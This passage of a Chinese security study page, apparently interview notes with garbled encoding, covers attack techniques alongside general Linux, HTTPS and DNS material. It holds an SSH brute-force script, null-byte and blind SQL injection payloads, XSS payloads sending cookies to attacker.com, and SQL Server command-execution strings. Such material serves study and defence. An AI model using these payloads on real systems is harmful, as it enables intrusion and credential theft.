class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="comment"># æš´åŠ›ç ´è§£ VPN ç”¨æˆ·åå’Œå¯†ç </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_vpn</span>(<span class="params">ip, usernames, passwords</span>):</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> usernames:</span><br><span class="line">        <span class="keyword">for</span> pwd <span class="keyword">in</span> passwords:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                client = paramiko.SSHClient()</span><br><span class="line">                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">                client.connect(ip, username=user, password=pwd)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Success: <span class="subst">&#123;user&#125;</span>/<span class="subst">&#123;pwd&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Brute force failed.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¤ºä¾‹ç”¨æˆ·åå’Œå¯†ç åˆ—è¡¨</span></span><br><span class="line">usernames = [<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;user&quot;</span>]</span><br><span class="line">passwords = [<span class="string">&quot;password&quot;</span>, <span class="string">&quot;123456&quot;</span>]</span><br><span class="line"></span><br><span class="line">brute_force_vpn(<span class="string">&quot;vpn.example.com&quot;</span>, usernames, passwords)</span><br></pre></td></tr></table></figure><p><strong>å·¥å…·æ¨è</strong>ï¼š  </p><ul><li><code>Hydra</code>ï¼šæš´åŠ›ç ´è§£å·¥å…·ã€‚</li><li><code>Metasploit</code>ï¼šåˆ©ç”¨ VPN æ¼æ´ã€‚</li></ul><h3 id="1-00æˆªæ–­çš„åŸç†"><a href="#1-00æˆªæ–­çš„åŸç†" class="headerlink" title="1. %00æˆªæ–­çš„åŸç†"></a><strong>1. %00æˆªæ–­çš„åŸç†</strong></h3><p>%00ï¼ˆnullå­—èŠ‚ï¼‰æ˜¯ä¸€ç§å­—ç¬¦ä¸²æˆªæ–­æŠ€æœ¯ï¼Œå¸¸ç”¨äºç»•è¿‡å®‰å…¨æ£€æŸ¥æˆ–è§¦å‘æ¼æ´ã€‚å…¶åŸç†æ˜¯åˆ©ç”¨ç¼–ç¨‹è¯­è¨€æˆ–ç³»ç»Ÿå¯¹å­—ç¬¦ä¸²å¤„ç†çš„ç‰¹æ€§ï¼Œå½“é‡åˆ°nullå­—èŠ‚æ—¶ï¼Œä¼šè®¤ä¸ºå­—ç¬¦ä¸²ç»“æŸã€‚è¿™ç§ç‰¹æ€§å¯ä»¥è¢«æ”»å‡»è€…åˆ©ç”¨æ¥æˆªæ–­è¾“å…¥ï¼Œä»è€Œç»•è¿‡éªŒè¯é€»è¾‘ã€‚</p><h4 id="å¸¸è§åº”ç”¨åœºæ™¯"><a href="#å¸¸è§åº”ç”¨åœºæ™¯" class="headerlink" title="å¸¸è§åº”ç”¨åœºæ™¯"></a><strong>å¸¸è§åº”ç”¨åœºæ™¯</strong></h4><ul><li><strong>æ–‡ä»¶åå¤„ç†</strong>ï¼šåœ¨æŸäº›è¯­è¨€ï¼ˆå¦‚C&#x2F;C++ï¼‰ä¸­ï¼Œå­—ç¬¦ä¸²ä»¥nullå­—èŠ‚ç»“æŸã€‚å¦‚æœæ”»å‡»è€…åœ¨æ–‡ä»¶åä¸­æ’å…¥%00ï¼Œç³»ç»Ÿå¯èƒ½ä¼šæˆªæ–­æ–‡ä»¶åï¼Œå¯¼è‡´è¯»å–æˆ–å†™å…¥æœªæˆæƒçš„æ–‡ä»¶ã€‚</li><li><strong>æ•°æ®åº“æ“ä½œ</strong>ï¼šåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ•°æ®åº“é©±åŠ¨å¯èƒ½å°†è¾“å…¥æˆªæ–­åˆ°nullå­—èŠ‚ï¼Œä»è€Œç»•è¿‡SQLæ³¨å…¥é˜²æŠ¤ã€‚</li></ul><h4 id="ç¤ºä¾‹ä»£ç "><a href="#ç¤ºä¾‹ä»£ç " class="headerlink" title="ç¤ºä¾‹ä»£ç "></a><strong>ç¤ºä¾‹ä»£ç </strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// å‡è®¾æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶å·²å­˜åœ¨&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="string">&quot;å†…å®¹&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶åˆ›å»ºæˆåŠŸ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>æ”»å‡»ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/script.php?file=malicious.php%00</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>%00</code>ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡<code>.txt</code>åç¼€æ£€æŸ¥ï¼Œä¸Šä¼ æ¶æ„æ–‡ä»¶ã€‚</p><h3 id="2-SQLç›²æ³¨çš„è¯­å¥"><a href="#2-SQLç›²æ³¨çš„è¯­å¥" class="headerlink" title="2. SQLç›²æ³¨çš„è¯­å¥"></a><strong>2. SQLç›²æ³¨çš„è¯­å¥</strong></h3><p>SQLç›²æ³¨æ˜¯ä¸€ç§é€šè¿‡å¸ƒå°”æ¡ä»¶æˆ–æ—¶é—´å»¶è¿Ÿæ¥æ¨æ–­æ•°æ®åº“å†…å®¹çš„æ”»å‡»æ–¹å¼ã€‚ä»¥ä¸‹æ˜¯ä¸¤ç§å¸¸è§çš„ç›²æ³¨æ–¹æ³•ï¼š</p><h4 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a><strong>å¸ƒå°”ç›²æ³¨</strong></h4><p>é€šè¿‡åˆ¤æ–­æŸ¥è¯¢ç»“æœçš„å¸ƒå°”å€¼æ¥æ¨æ–­ä¿¡æ¯ã€‚</p><p><strong>ç¤ºä¾‹è¯­å¥</strong>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR IF(SUBSTRING(@@version,1,1)=&#x27;</span><span class="number">5</span><span class="string">&#x27;, 1, 0) --</span></span><br></pre></td></tr></table></figure><p><strong>è§£é‡Š</strong>ï¼š</p><ul><li><code>@@version</code>æ˜¯MySQLçš„ç‰ˆæœ¬ä¿¡æ¯ã€‚</li><li><code>SUBSTRING(@@version,1,1)</code>æå–ç‰ˆæœ¬çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚</li><li>å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯<code>5</code>ï¼Œåˆ™è¿”å›<code>1</code>ï¼Œå¦åˆ™è¿”å›<code>0</code>ã€‚</li><li><code>--</code>ç”¨äºæ³¨é‡Šæ‰å¤šä½™çš„SQLè¯­å¥ã€‚</li></ul><h4 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a><strong>æ—¶é—´ç›²æ³¨</strong></h4><p>é€šè¿‡å»¶è¿Ÿæ•°æ®åº“å“åº”æ—¶é—´æ¥åˆ¤æ–­æ¡ä»¶æ˜¯å¦æˆç«‹ã€‚</p><p><strong>ç¤ºä¾‹è¯­å¥</strong>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR IF(SUBSTRING(@@version,1,1)=&#x27;</span><span class="number">5</span><span class="string">&#x27;, SLEEP(5), 0) --</span></span><br></pre></td></tr></table></figure><p><strong>è§£é‡Š</strong>ï¼š</p><ul><li>å¦‚æœæ¡ä»¶æˆç«‹ï¼Œæ•°æ®åº“ä¼šå»¶è¿Ÿ5ç§’è¿”å›ã€‚</li><li>æ”»å‡»è€…å¯ä»¥é€šè¿‡è§‚å¯Ÿå“åº”æ—¶é—´æ¥åˆ¤æ–­æ¡ä»¶æ˜¯å¦æˆç«‹ã€‚</li></ul><h3 id="3-XSSè·å–cookieçš„payload"><a href="#3-XSSè·å–cookieçš„payload" class="headerlink" title="3. XSSè·å–cookieçš„payload"></a><strong>3. XSSè·å–cookieçš„payload</strong></h3><p>XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰æ˜¯ä¸€ç§é€šè¿‡æ³¨å…¥æ¶æ„è„šæœ¬çªƒå–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯çš„æ”»å‡»æ–¹å¼ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªè·å–cookieçš„payloadï¼š</p><h4 id="ç®€å•payload"><a href="#ç®€å•payload" class="headerlink" title="ç®€å•payload"></a><strong>ç®€å•payload</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// è·å–å½“å‰é¡µé¢çš„cookie</span></span><br><span class="line">    <span class="keyword">var</span> cookie = <span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line">    <span class="comment">// å°†cookieå‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://attacker.com/steal?cookie=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(cookie));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="å…¼å®¹æ—§æµè§ˆå™¨çš„payload"><a href="#å…¼å®¹æ—§æµè§ˆå™¨çš„payload" class="headerlink" title="å…¼å®¹æ—§æµè§ˆå™¨çš„payload"></a><strong>å…¼å®¹æ—§æµè§ˆå™¨çš„payload</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">    img.<span class="property">src</span> = <span class="string">&#x27;http://attacker.com/steal?cookie=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="æ›´éšè”½çš„payload"><a href="#æ›´éšè”½çš„payload" class="headerlink" title="æ›´éšè”½çš„payload"></a><strong>æ›´éšè”½çš„payload</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨setTimeoutå»¶è¿Ÿæ‰§è¡Œï¼Œé¿å…è¢«WAFæ£€æµ‹</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">        s.<span class="property">src</span> = <span class="string">&#x27;http://attacker.com/malicious.js&#x27;</span>;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="SQL-Serverå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•"><a href="#SQL-Serverå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•" class="headerlink" title="SQL Serverå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•"></a>SQL Serverå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•</h3><p>é™¤äº†<code>xp_cmdshell</code>ï¼Œè¿˜æœ‰ä»¥ä¸‹æ–¹æ³•ï¼š</p><ul><li><p><strong>sp_OACreate</strong> ï¼šé€šè¿‡åˆ›å»º<code>OLE</code>å¯¹è±¡å®ä¾‹ï¼Œç„¶ååˆ©ç”¨<code>sp_oamethod</code>è°ƒç”¨è¯¥å¯¹è±¡çš„æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œå…ˆåˆ¤æ–­<code>sp_OACreate</code>æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨åˆ™å¼€å¯ç›¸å…³é…ç½®ï¼Œæœ€åæ‰§è¡Œå‘½ä»¤å¹¶å°†ç»“æœå¯¼å‡ºè‡³æ–‡æœ¬ä¸­ï¼š</p><ul><li><p>åˆ¤æ–­æ˜¯å¦å­˜åœ¨ï¼š<code>select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;SP_OACREATE&#39;</code></p></li><li><p>å¼€å¯é…ç½®ï¼š</p><ul><li><code>EXEC sp_configure &#39;show advanced options&#39;, 1;</code></li><li><code>RECONFIGURE WITH OVERRIDE;</code></li><li><code>EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;</code></li><li><code>RECONFIGURE WITH OVERRIDE;</code></li></ul></li><li><p>æ‰§è¡Œå‘½ä»¤ï¼š<code>declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#39;</code></p></li></ul></li><li><p><strong>CLR</strong> ï¼šåœ¨SQL Serverä¸Šå¯ç”¨<code>CLR</code>å¹¶åˆ›å»ºè‡ªå®šä¹‰å­˜å‚¨è¿‡ç¨‹ï¼Œé€šè¿‡ç¼–å†™<code>C#</code>ä»£ç æ¥å®ç°å‘½ä»¤æ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨<code>visual studio 2022</code>åˆ›å»º<code>SQL Server</code>æ•°æ®åº“é¡¹ç›®ï¼Œç¼–å†™ä»£ç åç¼–è¯‘å¯¼å…¥ç¨‹åºé›†å¹¶åˆ›å»ºæ‰§è¡Œå‘½ä»¤å­˜å‚¨è¿‡ç¨‹çš„<code>SQL</code>è¯­å¥ã€‚</p></li></ul><h3 id="SQLæ³¨å…¥å¼•å·ç»•è¿‡"><a href="#SQLæ³¨å…¥å¼•å·ç»•è¿‡" class="headerlink" title="SQLæ³¨å…¥å¼•å·ç»•è¿‡"></a>SQLæ³¨å…¥å¼•å·ç»•è¿‡</h3><p>SQLæ³¨å…¥å¼•å·ç»•è¿‡é€šå¸¸æ˜¯åœ¨SQLæ³¨å…¥æ”»å‡»ä¸­ï¼Œä¸ºäº†æ„é€ åˆæ³•çš„SQLè¯­å¥ï¼Œé‡‡ç”¨ä¸€äº›æŠ€å·§æ¥é¿å…ä½¿ç”¨å¼•å·ã€‚ä¾‹å¦‚ï¼Œåˆ©ç”¨å­—ç¬¦ä¸²è¿æ¥ç¬¦ã€å‡½æ•°ç­‰æ¥ä»£æ›¿å¼•å·ã€‚æ¯”å¦‚ï¼Œ<code>&#39;</code>å¯ä»¥ç”¨<code>char(39)</code>æ¥ä»£æ›¿ï¼Œ<code>&quot;</code>å¯ä»¥ç”¨<code>char(34)</code>æ¥ä»£æ›¿ã€‚å¦å¤–ï¼Œè¿˜å¯ä»¥åˆ©ç”¨SQLè¯­å¥ä¸­çš„æ³¨é‡Šç¬¦æ¥ç»•è¿‡å¼•å·é™åˆ¶ï¼Œå¦‚<code>/*</code>å’Œ<code>*/</code>ã€‚</p><h3 id="SQLæ³¨å…¥è¯»æ–‡ä»¶å’Œå†™æ–‡ä»¶"><a href="#SQLæ³¨å…¥è¯»æ–‡ä»¶å’Œå†™æ–‡ä»¶" class="headerlink" title="SQLæ³¨å…¥è¯»æ–‡ä»¶å’Œå†™æ–‡ä»¶"></a>SQLæ³¨å…¥è¯»æ–‡ä»¶å’Œå†™æ–‡ä»¶</h3><ul><li><strong>è¯»æ–‡ä»¶</strong> ï¼šå¯ä»¥ä½¿ç”¨<code>OPENROWSET</code>ã€<code>BULK INSERT</code>ç­‰å‡½æ•°æ¥è¯»å–æ–‡ä»¶å†…å®¹ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨<code>OPENROWSET</code>è¯»å–æ–‡ä»¶ï¼š<code>SELECT * FROM OPENROWSET(&#39;SQLOLEDB&#39;,&#39;.;UID=sa;PWD=&#39;,&#39;select * from OPENROWSET(&#39;BULK &#39;&#39;C:\test.txt&#39;&#39;, SINGLE_BLOB) as t&#39;)</code>ã€‚</li><li><strong>å†™æ–‡ä»¶</strong> ï¼šä¸èƒ½ç›´æ¥ç”¨å‡½æ•°æ¥å†™æ–‡ä»¶ï¼Œå› ä¸ºå†™æ–‡ä»¶ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œéœ€è¦å€ŸåŠ©å…¶ä»–æ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥åˆ©ç”¨<code>xp_cmdshell</code>æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå°†æ•°æ®å†™å…¥æ–‡ä»¶ã€‚å¦‚<code>xp_cmdshell &#39;echo hello &gt; c:\test.txt&#39;</code>ã€‚</li></ul><h3 id="SQLæ³¨å…¥çš„ä¿®å¤"><a href="#SQLæ³¨å…¥çš„ä¿®å¤" class="headerlink" title="SQLæ³¨å…¥çš„ä¿®å¤"></a>SQLæ³¨å…¥çš„ä¿®å¤</h3><ul><li><strong>è¾“å…¥éªŒè¯</strong> ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œç¡®ä¿è¾“å…¥ç¬¦åˆé¢„æœŸçš„æ ¼å¼å’Œç±»å‹ã€‚</li><li><strong>å‚æ•°åŒ–æŸ¥è¯¢</strong> ï¼šä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æ¥é¿å…SQLæ³¨å…¥ï¼Œå°†ç”¨æˆ·è¾“å…¥ä½œä¸ºå‚æ•°ä¼ é€’ç»™æ•°æ®åº“ã€‚</li><li><strong>æœ€å°åŒ–æƒé™</strong> ï¼šä¸ºæ•°æ®åº“ç”¨æˆ·åˆ†é…æœ€å°çš„æƒé™ï¼Œé¿å…ç”¨æˆ·æ‹¥æœ‰ä¸å¿…è¦çš„æƒé™ã€‚</li><li><strong>æ›´æ–°å’Œè¡¥ä¸</strong> ï¼šåŠæ—¶æ›´æ–°æ•°æ®åº“ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºï¼Œåº”ç”¨å®‰å…¨è¡¥ä¸ï¼Œä¿®å¤å·²çŸ¥çš„å®‰å…¨æ¼æ´ã€‚</li></ul><h3 id="Linuxå‘½ä»¤"><a href="#Linuxå‘½ä»¤" class="headerlink" title="Linuxå‘½ä»¤"></a>Linuxå‘½ä»¤</h3><ul><li><strong>æœ€è¿‘ç™»å½•çš„ç”¨æˆ·</strong> ï¼šå¯ä»¥ä½¿ç”¨<code>last</code>å‘½ä»¤æŸ¥çœ‹æœ€è¿‘ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ã€‚</li><li><strong>æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„å500è¡Œ</strong> ï¼šä½¿ç”¨<code>tail -n 500</code>å‘½ä»¤ã€‚</li><li><strong>æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„è¡Œæ•°</strong> ï¼šä½¿ç”¨<code>wc -l</code>å‘½ä»¤ã€‚</li><li><strong>æŸ¥æ‰¾æ–‡ä»¶çš„ä½ç½®</strong> ï¼šå¯ä»¥ä½¿ç”¨<code>find</code>å‘½ä»¤æˆ–<code>locate</code>å‘½ä»¤ã€‚<code>find</code>å‘½ä»¤å¯ä»¥æ ¹æ®æ–‡ä»¶åã€è·¯å¾„ã€ç±»å‹ç­‰æ¡ä»¶æŸ¥æ‰¾æ–‡ä»¶ï¼Œå¦‚<code>find / -name filename</code>ã€‚<code>locate</code>å‘½ä»¤åˆ™åŸºäºæ•°æ®åº“æŸ¥æ‰¾æ–‡ä»¶ï¼Œé€Ÿåº¦è¾ƒå¿«ï¼Œä½†æ•°æ®åº“éœ€è¦å®šæœŸæ›´æ–°ï¼Œå¦‚<code>locate filename</code>ã€‚</li></ul><h3 id="Linuxæ–‡ä»¶æƒé™777"><a href="#Linuxæ–‡ä»¶æƒé™777" class="headerlink" title="Linuxæ–‡ä»¶æƒé™777"></a>Linuxæ–‡ä»¶æƒé™777</h3><p>777ä»£è¡¨æ‰€æœ‰è€…ã€æ‰€å±ç»„å’Œå…¶ä»–ç”¨æˆ·éƒ½æ‹¥æœ‰è¯»ï¼ˆ<code>r</code>ï¼‰ã€å†™ï¼ˆ<code>w</code>ï¼‰å’Œæ‰§è¡Œï¼ˆ<code>x</code>ï¼‰æƒé™ã€‚å…¶ä¸­ï¼Œç¬¬ä¸€ä¸ªæ•°å­—è¡¨ç¤ºæ‰€æœ‰è€…æƒé™ï¼Œç¬¬äºŒä¸ªæ•°å­—è¡¨ç¤ºæ‰€å±ç»„æƒé™ï¼Œç¬¬ä¸‰ä¸ªæ•°å­—è¡¨ç¤ºå…¶ä»–ç”¨æˆ·æƒé™ã€‚æ¯ä¸ªæ•°å­—å¯¹åº”ä¸åŒçš„æƒé™ï¼Œ<code>r</code>ä»£è¡¨4ï¼Œ<code>w</code>ä»£è¡¨2ï¼Œ<code>x</code>ä»£è¡¨1ã€‚</p><h3 id="Windowså‘½ä»¤"><a href="#Windowså‘½ä»¤" class="headerlink" title="Windowså‘½ä»¤"></a>Windowså‘½ä»¤</h3><ul><li><strong>çŸ¥é“ä¸€ä¸ªç«¯å£ï¼Œæ‰¾è¿›ç¨‹</strong> ï¼šå¯ä»¥ä½¿ç”¨<code>netstat -ano | findstr ç«¯å£å·</code>å‘½ä»¤ï¼Œæ‰¾åˆ°ä¸è¯¥ç«¯å£ç›¸å…³çš„è¿›ç¨‹<code>ID</code>ã€‚</li><li><strong>æ€è¿›ç¨‹çš„å‘½ä»¤</strong> ï¼šä½¿ç”¨<code>taskkill /PID è¿›ç¨‹ID /F</code>å‘½ä»¤ã€‚</li><li><strong>å¯åŠ¨å’Œç»ˆæ­¢è¿›ç¨‹</strong> ï¼šå¯åŠ¨è¿›ç¨‹å¯ä»¥ä½¿ç”¨<code>start</code>å‘½ä»¤ï¼Œå¦‚<code>start notepad.exe</code>ã€‚ç»ˆæ­¢è¿›ç¨‹å¯ä»¥ä½¿ç”¨<code>taskkill</code>å‘½ä»¤ï¼Œå¦‚<code>taskkill /IM è¿›ç¨‹å /F</code>ã€‚</li></ul><h3 id="HTTPSå»ºç«‹è¿‡ç¨‹"><a href="#HTTPSå»ºç«‹è¿‡ç¨‹" class="headerlink" title="HTTPSå»ºç«‹è¿‡ç¨‹"></a>HTTPSå»ºç«‹è¿‡ç¨‹</h3><ol><li><strong>æ¡æ‰‹é˜¶æ®µ</strong>ï¼šå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨é€šè¿‡äº¤æ¢ä¿¡æ¯æ¥åå•†åŠ å¯†ç®—æ³•ã€å¯†é’¥ç­‰å‚æ•°ã€‚</li><li><strong>è¯ä¹¦éªŒè¯</strong>ï¼šæœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€æ•°å­—è¯ä¹¦ï¼Œå®¢æˆ·ç«¯éªŒè¯è¯ä¹¦çš„æœ‰æ•ˆæ€§ã€‚</li><li><strong>å¯†é’¥äº¤æ¢</strong>ï¼šåŒæ–¹é€šè¿‡åå•†ç®—æ³•äº¤æ¢å¯†é’¥ï¼Œç”¨äºåç»­çš„åŠ å¯†é€šä¿¡ã€‚</li><li><strong>åŠ å¯†é€šä¿¡</strong>ï¼šä½¿ç”¨åå•†å¥½çš„å¯†é’¥å’Œç®—æ³•è¿›è¡Œæ•°æ®åŠ å¯†ä¼ è¾“ã€‚</li></ol><h3 id="Pythonå†…å­˜ç®¡ç†"><a href="#Pythonå†…å­˜ç®¡ç†" class="headerlink" title="Pythonå†…å­˜ç®¡ç†"></a>Pythonå†…å­˜ç®¡ç†</h3><ol><li><strong>å¼•ç”¨è®¡æ•°</strong>ï¼šPythoné€šè¿‡å¼•ç”¨è®¡æ•°æ¥è·Ÿè¸ªå¯¹è±¡çš„å¼•ç”¨æƒ…å†µï¼Œå½“å¼•ç”¨è®¡æ•°ä¸ºé›¶æ—¶ï¼Œå¯¹è±¡ä¼šè¢«é”€æ¯å¹¶é‡Šæ”¾å†…å­˜ã€‚</li><li><strong>åƒåœ¾å›æ”¶</strong>ï¼šPythonä½¿ç”¨åˆ†ä»£åƒåœ¾å›æ”¶æœºåˆ¶æ¥å¤„ç†å¾ªç¯å¼•ç”¨ç­‰é—®é¢˜ã€‚</li><li><strong>å†…å­˜æ± ç®¡ç†</strong>ï¼šPythonæœ‰å†…å­˜æ± æœºåˆ¶ï¼Œç”¨äºç®¡ç†å°äº256å­—èŠ‚çš„å¯¹è±¡ï¼Œæé«˜å†…å­˜åˆ†é…æ•ˆç‡ã€‚</li></ol><h3 id="æº¯æºæ”»å‡»ç¤ºä¾‹"><a href="#æº¯æºæ”»å‡»ç¤ºä¾‹" class="headerlink" title="æº¯æºæ”»å‡»ç¤ºä¾‹"></a>æº¯æºæ”»å‡»ç¤ºä¾‹</h3><ol><li><strong>æ—¥å¿—åˆ†æ</strong>ï¼šé€šè¿‡åˆ†ææœåŠ¡å™¨æ—¥å¿—ï¼Œå¯»æ‰¾å¼‚å¸¸çš„è®¿é—®æ¨¡å¼å’Œæ¥æºIPã€‚</li><li><strong>æ•°æ®åŒ…æ•è·</strong>ï¼šä½¿ç”¨å·¥å…·å¦‚Wiresharkæ•è·ç½‘ç»œæ•°æ®åŒ…ï¼Œåˆ†ææ”»å‡»æ¥æºã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼šå‡è®¾æŸç½‘ç«™é­å—äº†SQLæ³¨å…¥æ”»å‡»ï¼Œé€šè¿‡æŸ¥çœ‹WebæœåŠ¡å™¨æ—¥å¿—ï¼Œå‘ç°æ¥è‡ªç‰¹å®šIPçš„å¼‚å¸¸SQLè¯·æ±‚ï¼Œè¿›ä¸€æ­¥åˆ†æè¯¥IPçš„ç›¸å…³ä¿¡æ¯ï¼Œç¡®å®šæ”»å‡»æ¥æºã€‚</li></ol><h3 id="DNSåè®®çš„ä½œç”¨ä¸è§£æè¿‡ç¨‹"><a href="#DNSåè®®çš„ä½œç”¨ä¸è§£æè¿‡ç¨‹" class="headerlink" title="DNSåè®®çš„ä½œç”¨ä¸è§£æè¿‡ç¨‹"></a>DNSåè®®çš„ä½œç”¨ä¸è§£æè¿‡ç¨‹</h3><ol><li><strong>ä½œç”¨</strong>ï¼šå°†åŸŸåè½¬æ¢ä¸ºIPåœ°å€ï¼Œä¾¿äºç”¨æˆ·è®°å¿†å’Œè®¿é—®ç½‘ç«™ã€‚</li><li><strong>è§£æè¿‡ç¨‹</strong>ï¼šä»æœ¬åœ°DNSç¼“å­˜å¼€å§‹ï¼Œé€çº§æŸ¥è¯¢æ ¹DNSæœåŠ¡å™¨ã€é¡¶çº§åŸŸåæœåŠ¡å™¨ã€æƒå¨DNSæœåŠ¡å™¨ï¼Œç›´åˆ°è·å–ç›®æ ‡åŸŸåçš„IPåœ°å€ã€‚</li></ol><h3 id="DNSåè®®çš„å®‰å…¨é—®é¢˜"><a href="#DNSåè®®çš„å®‰å…¨é—®é¢˜" class="headerlink" 